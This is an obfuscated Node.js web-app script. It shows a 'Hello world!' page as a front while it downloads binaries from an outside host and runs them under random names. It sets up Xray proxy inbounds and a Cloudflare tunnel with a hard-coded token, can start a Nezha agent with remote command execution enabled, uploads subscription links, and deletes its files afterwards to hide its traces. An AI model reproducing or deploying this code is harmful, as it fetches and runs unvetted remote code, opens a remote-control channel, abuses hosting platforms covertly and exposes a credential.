const _0x66b6e0=_0x3ecc;(function(_0x2c0132,_0x44397f){const _0x170751=_0x3ecc,_0x451386=_0x2c0132();while(!![]){try{const _0x2d1dfe=-parseInt(_0x170751(0x233))/0x1+parseInt(_0x170751(0x28a))/0x2+-parseInt(_0x170751(0x25f))/0x3*(-parseInt(_0x170751(0x263))/0x4)+parseInt(_0x170751(0x1e6))/0x5*(-parseInt(_0x170751(0x275))/0x6)+parseInt(_0x170751(0x240))/0x7*(-parseInt(_0x170751(0x1de))/0x8)+-parseInt(_0x170751(0x253))/0x9+parseInt(_0x170751(0x274))/0xa;if(_0x2d1dfe===_0x44397f)break;else _0x451386['push'](_0x451386['shift']());}catch(_0x3e83aa){_0x451386['push'](_0x451386['shift']());}}}(_0x4abb,0x7bba7));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x66b6e0(0x231)),exec=promisify(require('child_process')[_0x66b6e0(0x27c)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x66b6e0(0x265)][_0x66b6e0(0x24c)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x66b6e0(0x265)]['FILE_PATH']||_0x66b6e0(0x1f5),SUB_PATH=process[_0x66b6e0(0x265)][_0x66b6e0(0x24a)]||_0x66b6e0(0x20b),PORT=process['env'][_0x66b6e0(0x23d)]||process['env'][_0x66b6e0(0x225)]||0xbb8,UUID=process[_0x66b6e0(0x265)]['UUID']||'affef492-d3c9-4a7b-af2f-648c34fe6ad6',NEZHA_SERVER=process[_0x66b6e0(0x265)][_0x66b6e0(0x223)]||'',NEZHA_PORT=process[_0x66b6e0(0x265)][_0x66b6e0(0x251)]||'',NEZHA_KEY=process[_0x66b6e0(0x265)][_0x66b6e0(0x1e2)]||'',ARGO_DOMAIN=process[_0x66b6e0(0x265)][_0x66b6e0(0x22a)]||_0x66b6e0(0x27f),ARGO_AUTH=process[_0x66b6e0(0x265)][_0x66b6e0(0x267)]||'eyJhIjoiMGEyMjJmMDdmNTkwNDU0YzM5ZWU5NWYyZmI0NjRmYzciLCJ0IjoiZDg5MDVlYTEtOTc2My00NTdjLWI1OWYtZDNiM2RhNjQwZTg1IiwicyI6Ik1EazVNelF3WXpFdE0yVXlNUzAwWm1NMkxXRTRaRE10TjJJMU56bGhaREF6TkRZeCJ9',ARGO_PORT=process[_0x66b6e0(0x265)]['ARGO_PORT']||0x1f41,CFIP=process[_0x66b6e0(0x265)][_0x66b6e0(0x20f)]||_0x66b6e0(0x245),CFPORT=process['env'][_0x66b6e0(0x1dd)]||0x1bb,NAME=process[_0x66b6e0(0x265)][_0x66b6e0(0x262)]||'007-lw20251029';!fs[_0x66b6e0(0x1fc)](FILE_PATH)?(fs[_0x66b6e0(0x271)](FILE_PATH),console['log'](FILE_PATH+_0x66b6e0(0x256))):console[_0x66b6e0(0x204)](FILE_PATH+_0x66b6e0(0x291));function generateRandomName(){const _0x3b6201=_0x66b6e0,_0x1d5b12=_0x3b6201(0x23b);let _0x2bc620='';for(let _0x1dcd2b=0x0;_0x1dcd2b<0x6;_0x1dcd2b++){_0x2bc620+=_0x1d5b12[_0x3b6201(0x1d9)](Math[_0x3b6201(0x23a)](Math[_0x3b6201(0x264)]()*_0x1d5b12[_0x3b6201(0x1f0)]));}return _0x2bc620;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x66b6e0(0x1fd)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x66b6e0(0x1fd)](FILE_PATH,botName),subPath=path[_0x66b6e0(0x1fd)](FILE_PATH,'sub.txt'),listPath=path[_0x66b6e0(0x1fd)](FILE_PATH,'list.txt'),bootLogPath=path[_0x66b6e0(0x1fd)](FILE_PATH,_0x66b6e0(0x215)),configPath=path[_0x66b6e0(0x1fd)](FILE_PATH,_0x66b6e0(0x28d));function deleteNodes(){const _0x5051e9=_0x66b6e0;try{if(!UPLOAD_URL)return;if(!fs[_0x5051e9(0x1fc)](subPath))return;let _0x31ec52;try{_0x31ec52=fs[_0x5051e9(0x216)](subPath,_0x5051e9(0x209));}catch{return null;}const _0x5cbdb9=Buffer[_0x5051e9(0x25c)](_0x31ec52,'base64')['toString'](_0x5051e9(0x209)),_0x3ca5ad=_0x5cbdb9['split']('\x0a')[_0x5051e9(0x1f2)](_0x37a514=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5051e9(0x239)](_0x37a514));if(_0x3ca5ad[_0x5051e9(0x1f0)]===0x0)return;return axios[_0x5051e9(0x217)](UPLOAD_URL+_0x5051e9(0x207),JSON[_0x5051e9(0x241)]({'nodes':_0x3ca5ad}),{'headers':{'Content-Type':'application/json'}})[_0x5051e9(0x286)](_0x21a2b6=>{return null;}),null;}catch(_0x5b4b3a){return null;}}function cleanupOldFiles(){const _0x5d0807=_0x66b6e0;try{const _0x28f5d7=fs['readdirSync'](FILE_PATH);_0x28f5d7[_0x5d0807(0x243)](_0x3c993e=>{const _0x55e678=_0x5d0807,_0x5cd461=path[_0x55e678(0x1fd)](FILE_PATH,_0x3c993e);try{const _0x467fc4=fs[_0x55e678(0x229)](_0x5cd461);_0x467fc4[_0x55e678(0x237)]()&&fs[_0x55e678(0x255)](_0x5cd461);}catch(_0x2a42e8){}});}catch(_0x500e6f){}}app['get']('/',function(_0x2d512d,_0x4d9564){_0x4d9564['send']('Hello\x20world!');});async function generateConfig(){const _0x1e6fe3=_0x66b6e0,_0x1926ca={'log':{'access':_0x1e6fe3(0x1dc),'error':_0x1e6fe3(0x1dc),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1e6fe3(0x22c),'settings':{'clients':[{'id':UUID,'flow':_0x1e6fe3(0x279)}],'decryption':_0x1e6fe3(0x20d),'fallbacks':[{'dest':0xbb9},{'path':_0x1e6fe3(0x269),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x1e6fe3(0x1fe),'dest':0xbbc}]},'streamSettings':{'network':_0x1e6fe3(0x203)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x1e6fe3(0x20d)}},{'port':0xbba,'listen':_0x1e6fe3(0x202),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1e6fe3(0x20d)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x1e6fe3(0x269)}},'sniffing':{'enabled':!![],'destOverride':[_0x1e6fe3(0x24f),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1e6fe3(0x202),'protocol':_0x1e6fe3(0x287),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1e6fe3(0x24f),_0x1e6fe3(0x205),_0x1e6fe3(0x278)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1e6fe3(0x202),'protocol':_0x1e6fe3(0x288),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1e6fe3(0x20d),'wsSettings':{'path':_0x1e6fe3(0x1fe)}},'sniffing':{'enabled':!![],'destOverride':[_0x1e6fe3(0x24f),'tls',_0x1e6fe3(0x278)],'metadataOnly':![]}}],'dns':{'servers':[_0x1e6fe3(0x26b)]},'outbounds':[{'protocol':_0x1e6fe3(0x244),'tag':'direct'},{'protocol':_0x1e6fe3(0x1d5),'tag':'block'}]};fs[_0x1e6fe3(0x211)](path[_0x1e6fe3(0x1fd)](FILE_PATH,_0x1e6fe3(0x28d)),JSON['stringify'](_0x1926ca,null,0x2));}function _0x3ecc(_0x455744,_0x27d95b){const _0x4abb8c=_0x4abb();return _0x3ecc=function(_0x3ecc8b,_0x402f95){_0x3ecc8b=_0x3ecc8b-0x1d5;let _0x536e13=_0x4abb8c[_0x3ecc8b];return _0x536e13;},_0x3ecc(_0x455744,_0x27d95b);}function getSystemArchitecture(){const _0x326962=_0x66b6e0,_0x5812c4=os[_0x326962(0x249)]();return _0x5812c4===_0x326962(0x22b)||_0x5812c4==='arm64'||_0x5812c4===_0x326962(0x276)?_0x326962(0x22b):_0x326962(0x242);}function downloadFile(_0x2ca1a3,_0xf77bc1,_0x2aed00){const _0x5aa0d9=_0x66b6e0,_0x2b7abb=_0x2ca1a3;!fs[_0x5aa0d9(0x1fc)](FILE_PATH)&&fs[_0x5aa0d9(0x271)](FILE_PATH,{'recursive':!![]});const _0x20e6e3=fs[_0x5aa0d9(0x268)](_0x2b7abb);axios({'method':_0x5aa0d9(0x238),'url':_0xf77bc1,'responseType':_0x5aa0d9(0x24b)})[_0x5aa0d9(0x1e7)](_0x2daeb2=>{const _0x2ee566=_0x5aa0d9;_0x2daeb2[_0x2ee566(0x1e1)]['pipe'](_0x20e6e3),_0x20e6e3['on'](_0x2ee566(0x28f),()=>{const _0x3af877=_0x2ee566;_0x20e6e3[_0x3af877(0x284)](),console['log'](_0x3af877(0x236)+path[_0x3af877(0x1fb)](_0x2b7abb)+_0x3af877(0x27b)),_0x2aed00(null,_0x2b7abb);}),_0x20e6e3['on'](_0x2ee566(0x230),_0x33975f=>{const _0x304be0=_0x2ee566;fs[_0x304be0(0x247)](_0x2b7abb,()=>{});const _0x3acc76=_0x304be0(0x236)+path[_0x304be0(0x1fb)](_0x2b7abb)+_0x304be0(0x282)+_0x33975f['message'];console[_0x304be0(0x230)](_0x3acc76),_0x2aed00(_0x3acc76);});})[_0x5aa0d9(0x286)](_0x1876b8=>{const _0x2f13ad=_0x5aa0d9,_0x3a50db='Download\x20'+path['basename'](_0x2b7abb)+'\x20failed:\x20'+_0x1876b8[_0x2f13ad(0x250)];console[_0x2f13ad(0x230)](_0x3a50db),_0x2aed00(_0x3a50db);});}function _0x4abb(){const _0x2ecf28=['https://arm64.ssss.nyc.mn/bot','\x20>/dev/null\x202>&1\x20&','basename','existsSync','join','/trojan-argo','\x20-c\x20\x22','tunnel.yml','nohup\x20','127.0.0.1','tcp','log','tls','toString','/api/delete-nodes','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','utf-8','Error\x20downloading\x20files:','sub','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','none','clear','CFIP','match','writeFileSync','automatic\x20access\x20task\x20added\x20successfully','text/plain;\x20charset=utf-8','https://amd64.ssss.nyc.mn/web','boot.log','readFileSync','post','--tls','http\x20server\x20is\x20running\x20on\x20port:','2053','https://arm64.ssss.nyc.mn/agent','Skipping\x20adding\x20automatic\x20access\x20task','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2096','chmod','https://arm64.ssss.nyc.mn/v1','App\x20is\x20running','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','Nodes\x20uploaded\x20successfully','PORT','config.yaml','base64','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','statSync','ARGO_DOMAIN','arm','vless','taskkill\x20/f\x20/im\x20','/sub.txt\x20saved\x20successfully','substring','error','util','status','351354pTGtcL','&fp=firefox&type=ws&host=','firefox','Download\x20','isFile','get','test','floor','abcdefghijklmnopqrstuvwxyz','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','SERVER_PORT','Unhandled\x20error\x20in\x20startserver:','2083','98vTVJUg','stringify','amd','forEach','freedom','cdns.doon.eu.org','push','unlink','split','arch','SUB_PATH','stream','UPLOAD_URL','/vmess-argo?ed=2560','includes','http','message','NEZHA_PORT','TunnelSecret','5611401gJzRGx','web\x20running\x20error:\x20','unlinkSync','\x20is\x20created','Add\x20automatic\x20access\x20task\x20faild:\x20','&path=%2Fvless-argo%3Fed%3D2560#','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','443','set','from','application/json','https://arm64.ssss.nyc.mn/web','3pWXGyw','Empowerment\x20failed\x20for\x20','\x22\x20>\x20/dev/null\x202>&1','NAME','2350084gMmBAH','random','env','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','createWriteStream','/vless-argo','?encryption=none&security=tls&sni=','https+local://8.8.8.8/dns-query','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x20\x20\x0atrojan://','2087','Error\x20in\x20startserver:','\x0a\x20\x20\x0avmess://','mkdirSync','\x20-c\x20','Error\x20executing\x20command:\x20','15550260rLvGPq','666Qrqarp','aarch64','\x20>/dev/null\x202>&1','quic','xtls-rprx-vision','pop','\x20successfully','exec','tunnel.json','\x0avless://','xzjlw.hxy007.top','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20failed:\x20','.exe\x20>\x20nul\x202>&1','close','has','catch','vmess','trojan','/api/add-nodes','508812VKXzyB','&path=%2Ftrojan-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/agent','config.json','rm\x20-rf\x20','finish','fileUrl','\x20already\x20exists','blackhole','NEZHA\x20variable\x20is\x20empty,skip\x20running','Content-Type','del\x20/f\x20/q\x20','charAt','\x20is\x20running','https://amd64.ssss.nyc.mn/bot','/dev/null','CFPORT','147352BFNaJT','unshift','/api/add-subscriptions','data','NEZHA_KEY','\x0aclient_secret:\x20','ARGO_DOMAIN:','platform','29615PmtvmV','then','8443','Empowerment\x20success\x20for\x20','https://amd64.ssss.nyc.mn/v1','Subscription\x20uploaded\x20successfully','send','\x0a\x20\x20credentials-file:\x20','fileName','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','length','\x0a\x20\x20tunnel:\x20','filter','response','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','./tmp','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','win32','all'];_0x4abb=function(){return _0x2ecf28;};return _0x4abb();}async function downloadFilesAndRun(){const _0x74103d=_0x66b6e0,_0x2e05e4=getSystemArchitecture(),_0x295484=getFilesForArchitecture(_0x2e05e4);if(_0x295484['length']===0x0){console['log'](_0x74103d(0x21d));return;}const _0x3ddd2e=_0x295484['map'](_0xd66803=>{return new Promise((_0x132ae3,_0x4961a8)=>{const _0x2d5638=_0x3ecc;downloadFile(_0xd66803[_0x2d5638(0x1ee)],_0xd66803[_0x2d5638(0x290)],(_0x131266,_0x3deb68)=>{_0x131266?_0x4961a8(_0x131266):_0x132ae3(_0x3deb68);});});});try{await Promise[_0x74103d(0x1f8)](_0x3ddd2e);}catch(_0x5d2db1){console[_0x74103d(0x230)](_0x74103d(0x20a),_0x5d2db1);return;}function _0x774ef0(_0xb5c9a1){const _0x17ee0d=_0x74103d,_0x156cfc=0x1fd;_0xb5c9a1[_0x17ee0d(0x243)](_0x23cd13=>{const _0x5c5b1e=_0x17ee0d;fs[_0x5c5b1e(0x1fc)](_0x23cd13)&&fs[_0x5c5b1e(0x21f)](_0x23cd13,_0x156cfc,_0x11e938=>{const _0x502587=_0x5c5b1e;_0x11e938?console[_0x502587(0x230)](_0x502587(0x260)+_0x23cd13+':\x20'+_0x11e938):console[_0x502587(0x204)](_0x502587(0x1e9)+_0x23cd13+':\x20'+_0x156cfc['toString'](0x8));});});}const _0x111e3f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x774ef0(_0x111e3f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x40eac4=NEZHA_SERVER[_0x74103d(0x24e)](':')?NEZHA_SERVER['split'](':')[_0x74103d(0x27a)]():'',_0x223e71=new Set([_0x74103d(0x25a),_0x74103d(0x1e8),_0x74103d(0x21e),_0x74103d(0x26e),_0x74103d(0x23f),_0x74103d(0x21a)]),_0x62bf67=_0x223e71[_0x74103d(0x285)](_0x40eac4)?'true':'false',_0x21dc91=_0x74103d(0x1e3)+NEZHA_KEY+_0x74103d(0x1ef)+NEZHA_SERVER+_0x74103d(0x259)+_0x62bf67+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x74103d(0x211)](path[_0x74103d(0x1fd)](FILE_PATH,_0x74103d(0x226)),_0x21dc91);const _0x347657=_0x74103d(0x201)+phpPath+_0x74103d(0x1ff)+FILE_PATH+_0x74103d(0x222);try{await exec(_0x347657),console[_0x74103d(0x204)](phpName+_0x74103d(0x1da)),await new Promise(_0x5abe56=>setTimeout(_0x5abe56,0x3e8));}catch(_0x1158f5){console['error']('php\x20running\x20error:\x20'+_0x1158f5);}}else{let _0x236ac7='';const _0x57658f=['443',_0x74103d(0x1e8),_0x74103d(0x21e),_0x74103d(0x26e),_0x74103d(0x23f),'2053'];_0x57658f['includes'](NEZHA_PORT)&&(_0x236ac7=_0x74103d(0x218));const _0x4acdc9='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x236ac7+_0x74103d(0x266);try{await exec(_0x4acdc9),console[_0x74103d(0x204)](npmName+_0x74103d(0x1da)),await new Promise(_0x5ac894=>setTimeout(_0x5ac894,0x3e8));}catch(_0xe9a0c1){console[_0x74103d(0x230)]('npm\x20running\x20error:\x20'+_0xe9a0c1);}}}else console[_0x74103d(0x204)](_0x74103d(0x1d6));const _0x24142d=_0x74103d(0x201)+webPath+_0x74103d(0x272)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x24142d),console[_0x74103d(0x204)](webName+'\x20is\x20running'),await new Promise(_0x55331c=>setTimeout(_0x55331c,0x3e8));}catch(_0x38c17f){console[_0x74103d(0x230)](_0x74103d(0x254)+_0x38c17f);}if(fs['existsSync'](botPath)){let _0x1e9060;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1e9060=_0x74103d(0x280)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1e9060=_0x74103d(0x20c)+FILE_PATH+'/tunnel.yml\x20run':_0x1e9060=_0x74103d(0x23c)+FILE_PATH+_0x74103d(0x228)+ARGO_PORT;try{await exec(_0x74103d(0x201)+botPath+'\x20'+_0x1e9060+_0x74103d(0x1fa)),console[_0x74103d(0x204)](botName+'\x20is\x20running'),await new Promise(_0x5dd0c0=>setTimeout(_0x5dd0c0,0x7d0));}catch(_0x42b171){console[_0x74103d(0x230)](_0x74103d(0x273)+_0x42b171);}}await new Promise(_0x24a762=>setTimeout(_0x24a762,0x1388));}function getFilesForArchitecture(_0x3cea00){const _0x13a942=_0x66b6e0;let _0x281027;_0x3cea00===_0x13a942(0x22b)?_0x281027=[{'fileName':webPath,'fileUrl':_0x13a942(0x25e)},{'fileName':botPath,'fileUrl':_0x13a942(0x1f9)}]:_0x281027=[{'fileName':webPath,'fileUrl':_0x13a942(0x214)},{'fileName':botPath,'fileUrl':_0x13a942(0x1db)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x38495e=_0x3cea00===_0x13a942(0x22b)?_0x13a942(0x21b):_0x13a942(0x28c);_0x281027[_0x13a942(0x1df)]({'fileName':npmPath,'fileUrl':_0x38495e});}else{const _0x52726f=_0x3cea00==='arm'?_0x13a942(0x220):_0x13a942(0x1ea);_0x281027['unshift']({'fileName':phpPath,'fileUrl':_0x52726f});}}return _0x281027;}function argoType(){const _0xcea908=_0x66b6e0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xcea908(0x204)](_0xcea908(0x1f4));return;}if(ARGO_AUTH[_0xcea908(0x24e)](_0xcea908(0x252))){fs[_0xcea908(0x211)](path[_0xcea908(0x1fd)](FILE_PATH,_0xcea908(0x27d)),ARGO_AUTH);const _0x1f0784=_0xcea908(0x1f1)+ARGO_AUTH[_0xcea908(0x248)]('\x22')[0xb]+_0xcea908(0x1ed)+path[_0xcea908(0x1fd)](FILE_PATH,_0xcea908(0x27d))+_0xcea908(0x26c)+ARGO_DOMAIN+_0xcea908(0x208)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0xcea908(0x211)](path['join'](FILE_PATH,_0xcea908(0x200)),_0x1f0784);}else console[_0xcea908(0x204)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x31e831=_0x66b6e0;let _0x167874;if(ARGO_AUTH&&ARGO_DOMAIN)_0x167874=ARGO_DOMAIN,console[_0x31e831(0x204)](_0x31e831(0x1e4),_0x167874),await _0x199447(_0x167874);else try{const _0x445e65=fs['readFileSync'](path[_0x31e831(0x1fd)](FILE_PATH,_0x31e831(0x215)),_0x31e831(0x209)),_0x2b68fd=_0x445e65[_0x31e831(0x248)]('\x0a'),_0x52e2b2=[];_0x2b68fd[_0x31e831(0x243)](_0x1f04c5=>{const _0x154f4a=_0x31e831,_0x472534=_0x1f04c5[_0x154f4a(0x210)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x472534){const _0x2d2ecf=_0x472534[0x1];_0x52e2b2[_0x154f4a(0x246)](_0x2d2ecf);}});if(_0x52e2b2['length']>0x0)_0x167874=_0x52e2b2[0x0],console['log']('ArgoDomain:',_0x167874),await _0x199447(_0x167874);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x31e831(0x255)](path[_0x31e831(0x1fd)](FILE_PATH,'boot.log'));async function _0x140db0(){const _0x587655=_0x31e831;try{process[_0x587655(0x1e5)]===_0x587655(0x1f7)?await exec(_0x587655(0x22d)+botName+_0x587655(0x283)):await exec('pkill\x20-f\x20\x22['+botName[_0x587655(0x1d9)](0x0)+']'+botName[_0x587655(0x22f)](0x1)+_0x587655(0x261));}catch(_0x3e5f93){}}_0x140db0(),await new Promise(_0x55b5f5=>setTimeout(_0x55b5f5,0xbb8));const _0x33f944='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x31e831(0x228)+ARGO_PORT;try{await exec(_0x31e831(0x201)+botPath+'\x20'+_0x33f944+_0x31e831(0x1fa)),console['log'](botName+_0x31e831(0x1da)),await new Promise(_0x332821=>setTimeout(_0x332821,0xbb8)),await extractDomains();}catch(_0x3fae7a){console['error'](_0x31e831(0x273)+_0x3fae7a);}}}catch(_0xe1b9f7){console[_0x31e831(0x230)]('Error\x20reading\x20boot.log:',_0xe1b9f7);}async function _0x199447(_0x802b5b){const _0x46d047=_0x31e831,_0x5791e4=execSync(_0x46d047(0x1f6),{'encoding':'utf-8'}),_0xf2f8ce=_0x5791e4['trim'](),_0xc5b4c0=NAME?NAME+'-'+_0xf2f8ce:_0xf2f8ce;return new Promise(_0x135b40=>{setTimeout(()=>{const _0xca0be3=_0x3ecc,_0xff760f={'v':'2','ps':''+_0xc5b4c0,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xca0be3(0x20d),'host':_0x802b5b,'path':_0xca0be3(0x24d),'tls':_0xca0be3(0x205),'sni':_0x802b5b,'alpn':'','fp':_0xca0be3(0x235)},_0x1d2976=_0xca0be3(0x27e)+UUID+'@'+CFIP+':'+CFPORT+_0xca0be3(0x26a)+_0x802b5b+_0xca0be3(0x234)+_0x802b5b+_0xca0be3(0x258)+_0xc5b4c0+_0xca0be3(0x270)+Buffer['from'](JSON['stringify'](_0xff760f))[_0xca0be3(0x206)](_0xca0be3(0x227))+_0xca0be3(0x26d)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x802b5b+'&fp=firefox&type=ws&host='+_0x802b5b+_0xca0be3(0x28b)+_0xc5b4c0+'\x0a\x20\x20\x20\x20';console[_0xca0be3(0x204)](Buffer[_0xca0be3(0x25c)](_0x1d2976)[_0xca0be3(0x206)](_0xca0be3(0x227))),fs[_0xca0be3(0x211)](subPath,Buffer['from'](_0x1d2976)['toString'](_0xca0be3(0x227))),console[_0xca0be3(0x204)](FILE_PATH+_0xca0be3(0x22e)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x3330e4,_0x221657)=>{const _0x338f06=_0xca0be3,_0x220392=Buffer[_0x338f06(0x25c)](_0x1d2976)[_0x338f06(0x206)](_0x338f06(0x227));_0x221657[_0x338f06(0x25b)](_0x338f06(0x1d7),_0x338f06(0x213)),_0x221657[_0x338f06(0x1ec)](_0x220392);}),_0x135b40(_0x1d2976);},0x7d0);});}}async function uploadNodes(){const _0x550e9c=_0x66b6e0;if(UPLOAD_URL&&PROJECT_URL){const _0x393c38=PROJECT_URL+'/'+SUB_PATH,_0x58b975={'subscription':[_0x393c38]};try{const _0x240131=await axios[_0x550e9c(0x217)](UPLOAD_URL+_0x550e9c(0x1e0),_0x58b975,{'headers':{'Content-Type':_0x550e9c(0x25d)}});return _0x240131&&_0x240131[_0x550e9c(0x232)]===0xc8?(console[_0x550e9c(0x204)](_0x550e9c(0x1eb)),_0x240131):null;}catch(_0x340c76){if(_0x340c76[_0x550e9c(0x1f3)]){if(_0x340c76[_0x550e9c(0x1f3)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x550e9c(0x1fc)](listPath))return;const _0x2f8c96=fs[_0x550e9c(0x216)](listPath,_0x550e9c(0x209)),_0x113259=_0x2f8c96['split']('\x0a')[_0x550e9c(0x1f2)](_0x432366=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x432366));if(_0x113259[_0x550e9c(0x1f0)]===0x0)return;const _0x2988f7=JSON[_0x550e9c(0x241)]({'nodes':_0x113259});try{const _0x41327e=await axios[_0x550e9c(0x217)](UPLOAD_URL+_0x550e9c(0x289),_0x2988f7,{'headers':{'Content-Type':_0x550e9c(0x25d)}});return _0x41327e&&_0x41327e[_0x550e9c(0x232)]===0xc8?(console[_0x550e9c(0x204)](_0x550e9c(0x224)),_0x41327e):null;}catch(_0xe74e6c){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1db4db=_0x3ecc,_0x3189cd=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3189cd[_0x1db4db(0x246)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3189cd[_0x1db4db(0x246)](phpPath);process['platform']===_0x1db4db(0x1f7)?exec(_0x1db4db(0x1d8)+_0x3189cd[_0x1db4db(0x1fd)]('\x20')+'\x20>\x20nul\x202>&1',_0x2ec6c1=>{const _0x161a7b=_0x1db4db;console[_0x161a7b(0x20e)](),console[_0x161a7b(0x204)](_0x161a7b(0x221)),console[_0x161a7b(0x204)](_0x161a7b(0x281));}):exec(_0x1db4db(0x28e)+_0x3189cd['join']('\x20')+_0x1db4db(0x277),_0x664aa=>{const _0x392580=_0x1db4db;console[_0x392580(0x20e)](),console['log'](_0x392580(0x221)),console[_0x392580(0x204)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x25f8e9=_0x66b6e0;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x25f8e9(0x21c));return;}try{const _0xf14e7d=await axios[_0x25f8e9(0x217)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x25f8e9(0x25d)}});return console[_0x25f8e9(0x204)](_0x25f8e9(0x212)),_0xf14e7d;}catch(_0x249817){return console[_0x25f8e9(0x230)](_0x25f8e9(0x257)+_0x249817[_0x25f8e9(0x250)]),null;}}async function startserver(){const _0x1b6a19=_0x66b6e0;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4e1d16){console[_0x1b6a19(0x230)](_0x1b6a19(0x26f),_0x4e1d16);}}startserver()[_0x66b6e0(0x286)](_0x54a2f0=>{const _0x398ed9=_0x66b6e0;console[_0x398ed9(0x230)](_0x398ed9(0x23e),_0x54a2f0);}),app['listen'](PORT,()=>console[_0x66b6e0(0x204)](_0x66b6e0(0x219)+PORT+'!'));
